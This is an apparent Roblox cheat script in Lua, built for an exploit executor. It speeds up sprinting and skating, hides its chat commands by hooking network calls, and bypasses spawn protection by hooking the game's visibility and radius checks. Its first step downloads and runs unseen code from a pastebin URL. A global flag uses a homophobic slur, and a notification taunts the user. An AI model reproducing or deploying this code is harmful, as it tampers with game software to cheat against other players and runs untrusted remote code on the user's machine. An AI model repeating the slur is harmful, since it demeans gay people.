-- Merged script (all parts combined; removed plain wait() calls)
-- Note: kept :Wait() and :WaitForChild() where necessary, removed any plain wait() usage.

-- load external paste (left as-is)
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Sg7YR1pp"))()
end)

-- Services (single declaration)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- Modules (require once)
local Sprinting = ReplicatedStorage:FindFirstChild("Systems") and ReplicatedStorage.Systems.Character.Game.Sprinting
local Veer = ReplicatedStorage:FindFirstChild("Assets") and ReplicatedStorage.Assets.Survivors.Veeronica.Config

local Module = Sprinting and require(Sprinting) or {}
local Vodule = Veer and require(Veer) or {}

-- prefix
local prefix = "!cmd"

-- defaults
local DEFAULT_Below200Sprint = 27
local DEFAULT_Above200Sprint = 28

local DEFAULT_Sk8Speed = 1.35
local DEFAULT_Sk8TrickPower = 100
local DEFAULT_Sk8TurnDuration = 0.05
local DEFAULT_Sk8TurnControl = 3

-- editable values
local Below200Sprint = DEFAULT_Below200Sprint
local Above200Sprint = DEFAULT_Above200Sprint

local Sk8Speed = DEFAULT_Sk8Speed
local Sk8TrickPower = DEFAULT_Sk8TrickPower
local Sk8TurnDuration = DEFAULT_Sk8TurnDuration
local Sk8TurnControl = DEFAULT_Sk8TurnControl

local GradSpeedEnabled = false

-- sprint lerp
local currentSpeed = Above200Sprint
local LerpRate = 0.15

-- reset function
local function ResetValues()
    Below200Sprint = DEFAULT_Below200Sprint
    Above200Sprint = DEFAULT_Above200Sprint

    Sk8Speed = DEFAULT_Sk8Speed
    Sk8TrickPower = DEFAULT_Sk8TrickPower
    Sk8TurnDuration = DEFAULT_Sk8TurnDuration
    Sk8TurnControl = DEFAULT_Sk8TurnControl

    GradSpeedEnabled = true
    currentSpeed = Above200Sprint
end

-- nearest player finder
local function GetNearestPlayer()
    local nearest = nil
    local shortest = math.huge
    local root = Character and Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end

    for _,plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (root.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if dist < shortest then
                shortest = dist
                nearest = plr
            end
        end
    end

    return nearest, shortest
end

--------------------------------------------------------------------
-- CHAT BLOCKER (no commands appear in chat)
--------------------------------------------------------------------
local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if method == "FireServer"
    and tostring(self) == "SayMessageRequest"
    and typeof(args[1]) == "string"
    and string.sub(args[1],1,#prefix) == prefix then
        return nil
    end

    return OldNamecall(self, ...)
end)

--------------------------------------------------------------------
-- COMMAND LISTENER (silent)
--------------------------------------------------------------------
LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg,1,#prefix) ~= prefix then return end

    local args = string.split(msg," ")
    local command = args[2]
    local valueRaw = args[3]
    local value = tonumber(valueRaw)

    if command == "reset" then
        ResetValues()
        return
    end

    if command == "gradspeed" then
        if valueRaw == "true" then
            GradSpeedEnabled = true
        elseif valueRaw == "false" then
            GradSpeedEnabled = false
        end
        return
    end

    if not value then return end

    if command == "ssprint" then
        Below200Sprint = value

    elseif command == "ksprint" then
        Above200Sprint = value

    elseif command == "sk8speed" then
        Sk8Speed = value

    elseif command == "sk8power" then
        Sk8TrickPower = value

    elseif command == "sk8duration" then
        Sk8TurnDuration = value

    elseif command == "sk8control" then
        Sk8TurnControl = value
    end
end)

--------------------------------------------------------------------
-- lerp helper
--------------------------------------------------------------------
local function lerp(a,b,t)
    return a + (b - a) * t
end

--------------------------------------------------------------------
-- MAIN SPRINT / SKATE / STAMINA LOOP (RenderStepped)
--------------------------------------------------------------------
RunService.RenderStepped:Connect(function()
    -- keep Character reference up to date
    Character = LocalPlayer.Character or Character

    local humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if humanoid.Health >= 200 then
        if Module then
            Module.MaxStamina = 110
            Module.StaminaGain = 22
        end

        local targetSpeed = Above200Sprint

        if GradSpeedEnabled then
            local _, dist = GetNearestPlayer()
            if dist then
                if dist <= 15 then
                    targetSpeed = Above200Sprint
                elseif dist >= 30 then
                    targetSpeed = Above200Sprint * 1.25
                elseif dist >= 20 then
                    targetSpeed = Above200Sprint * 1.20
                end
            end
        end

        currentSpeed = lerp(currentSpeed, targetSpeed, LerpRate)
        if Module then Module.SprintSpeed = currentSpeed end

    else
        if Module then
            Module.MaxStamina = 100
            Module.StaminaGain = 21
            Module.SprintSpeed = Below200Sprint
        end

        if Vodule then
            Vodule.Sk8Speed = Sk8Speed
            Vodule.Sk8TrickPower = Sk8TrickPower
            Vodule.Sk8TurnDuration = Sk8TurnDuration
            Vodule.Sk8TurnControl = Sk8TurnControl
        end
    end

    if Module and Module.Stamina and Module.Stamina <= 1.5 then
        Module.StaminaLoss = 0
    elseif Module then
        Module.StaminaLoss = 9
    end
end)

-- Keep Character reference updated
LocalPlayer.CharacterAdded:Connect(function(char)
    Character = char
end)

--------------------------------------------------------------------
-- Character setup for overrides (no plain wait calls)
--------------------------------------------------------------------
local toggled = false

local function setupCharacter(character)
    local Humanoid = character:WaitForChild("Humanoid")
    local HumanoidRootPart = character:WaitForChild("HumanoidRootPart")

    _G.Humanoid = Humanoid
    _G.HumanoidRootPart = HumanoidRootPart
end

if LocalPlayer.Character then
    setupCharacter(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(function(character)
    setupCharacter(character)
end)

--------------------------------------------------------------------
-- Void Rush override (forces dashing movement while attribute present)
--------------------------------------------------------------------
local ORIGINAL_DASH_SPEED = 100
local isOverrideActive = false
local overrideConnection

local function startOverride()
    if isOverrideActive then return end
    isOverrideActive = true

    overrideConnection = RunService.RenderStepped:Connect(function()
        local humanoid = _G.Humanoid
        local rootPart = _G.HumanoidRootPart
        if not humanoid or not rootPart then return end

        humanoid.WalkSpeed = ORIGINAL_DASH_SPEED
        humanoid.AutoRotate = false

        local direction = rootPart.CFrame.LookVector
        local horizontal = Vector3.new(direction.X, 0, direction.Z)
        if horizontal.Magnitude > 0 then
            humanoid:Move(horizontal.Unit)
        end
    end)
end

local function stopOverride()
    if not isOverrideActive then return end
    isOverrideActive = false

    local humanoid = _G.Humanoid
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.AutoRotate = true
        humanoid:Move(Vector3.new(0, 0, 0))
    end

    if overrideConnection then
        overrideConnection:Disconnect()
        overrideConnection = nil
    end
end

RunService.RenderStepped:Connect(function()
    local char = _G.Humanoid and _G.Humanoid.Parent
    local voidRushState = char and char:GetAttribute and char:GetAttribute("VoidRushState")
    if voidRushState == "Dashing" then
        startOverride()
    else
        stopOverride()
    end
end)

--------------------------------------------------------------------
-- Spawn protection bypass block (single-run guard)
--------------------------------------------------------------------
if getgenv().SpawnistAreGay then
    StarterGui:SetCore("SendNotification", {
        Title = "u already executed what are you stupid?",
        Text = "lol",
        Duration = 10
    })
else
    getgenv().SpawnistAreGay = true

    -- Attempt to bypass certain checks by hooking functions if they exist
    pcall(function()
        local Util = ReplicatedStorage:FindFirstChild("Modules") and require(ReplicatedStorage.Modules.Util)
        local Behavior = ReplicatedStorage:FindFirstChild("Assets") and ReplicatedStorage.Assets.Survivors.Dusekkar and require(ReplicatedStorage.Assets.Survivors.Dusekkar.Behavior)

        if Util and Util.IsOnScreen then
            hookfunction(Util.IsOnScreen, function(...)
                return true
            end)
        end

        if Behavior then
            local success, isCharWithinRadius = pcall(function()
                return debug.getupvalue(Behavior.Created, 3)
            end)

            if success and type(isCharWithinRadius) == "function" then
                hookfunction(isCharWithinRadius, function(...)
                    return true, 0
                end)
            end
        end
    end)

    StarterGui:SetCore("SendNotification", {
        Title = "spawn protection bypass ez",
        Text = "done",
        Duration = 5
    })
end
